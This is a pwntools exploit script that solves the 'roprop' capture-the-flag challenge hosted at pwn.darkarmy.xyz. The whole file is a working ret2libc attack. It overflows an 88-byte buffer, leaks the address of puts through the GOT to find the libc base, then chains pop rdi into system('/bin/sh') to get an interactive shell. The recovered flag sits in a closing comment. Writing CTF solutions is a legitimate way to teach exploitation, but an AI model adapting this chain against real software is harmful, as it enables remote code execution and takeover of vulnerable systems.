from pwn import *
context(arch='i386', os='linux')

local = False


if local:
	p=process('./roprop')
else:
	p = remote('pwn.darkarmy.xyz',5002)


#p = process('./roprop')
#p = remote('pwn.darkarmy.xyz',5002)
binary = ELF('./roprop')
rop = ROP('./roprop')
#libc=  ELF('libc6_2.21-0ubuntu4_amd64.so')
libc= ELF('./libc6_2.27-3ubuntu1.2_amd64.so')


print(p.recv())
base = "A"*88
puts_plt = binary.sym['puts']
puts_got = binary.got['puts']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
main = binary.sym['main']

payload = base + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)
leak = p.recvline()

print(leak)
puts_leaked = u64(leak.strip().ljust(8,"\x00"))

libc.address = puts_leaked - libc.sym['puts']

log.success("puts leaked addr "+hex(puts_leaked))
log.success("libc leaked addr "+hex(libc.address))


sys = libc.sym['system']
binsh =next(libc.search("/bin/sh"))

payload2 = base + p64(pop_rdi) + p64(binsh) + p64(pop_rdi+1)+ p64(sys)


p.sendline(payload2)

p.interactive()

#print(p.recv())
#FLAG :darkCTF{y0u_r0p_r0p_4nd_w0n}
